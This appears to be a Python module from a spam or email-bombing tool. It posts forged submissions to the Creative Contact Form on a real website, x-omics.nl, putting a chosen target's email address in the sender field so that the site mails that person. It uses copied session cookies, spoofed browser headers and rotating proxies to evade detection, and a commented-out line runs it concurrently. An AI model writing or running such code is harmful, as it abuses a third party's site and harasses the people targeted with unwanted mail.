from os.path import basename

import requests

from module import Spam

cookies = {
    'cda811237395e54d6b4c6f5e9ae7c7e0': 'c447dcgmi2bvo5nk5oguchsvq9',
    '_ga': 'GA1.2.1045510897.1677057911',
    '_gid': 'GA1.2.1337282303.1677057911',
    '_gat_gtag_UA_134072054_1': '1',
}

headers = {
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'Cookie': 'cda811237395e54d6b4c6f5e9ae7c7e0=c447dcgmi2bvo5nk5oguchsvq9; _ga=GA1.2.1045510897.1677057911; _gid=GA1.2.1337282303.1677057911; _gat_gtag_UA_134072054_1=1',
    'Origin': 'https://x-omics.nl',
    'Referer': 'https://x-omics.nl/2-uncategorised/36-contactform',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

params = {
    'option': 'com_creativecontactform',
    'view': 'creativemailer',
    'format': 'raw',
}


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        data = {
            'creativecontactform_fields[1][0]': self.get_text(),
            'creativecontactform_fields[1][1]': 'Name',
            'creativecontactform_fields[1][2]': 'name',
            'creativecontactform_fields[2][0]': target,
            'creativecontactform_fields[2][1]': 'Email',
            'creativecontactform_fields[2][2]': 'email',
            'creativecontactform_fields[3][0]': 'Web search',
            'remove_this_partcreativecontactform_fields[3][0]': 'Web search',
            'creativecontactform_fields[3][1]': 'How did you find us?',
            'creativecontactform_fields[3][2]': 'radio',
            'creativecontactform_fields[4][0]': self.get_text(),
            'creativecontactform_fields[4][1]': 'Message',
            'creativecontactform_fields[4][2]': 'text-area',
            '95917cf730b2574c147f6f0b79b39d27': '1',
            'creativecontactform_module_id': '10000',
            'creativecontactform_form_id': '1',
        }

        response = requests.post('https://x-omics.nl/index.php', params=params, cookies=cookies, headers=headers,
                                 data=data, proxies=self.get_proxies())
        return response


def main():
    s = 'successfully'

    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post()
    # if res:
    #     spam.run_concurrently()


if __name__ == '__main__':
    main()
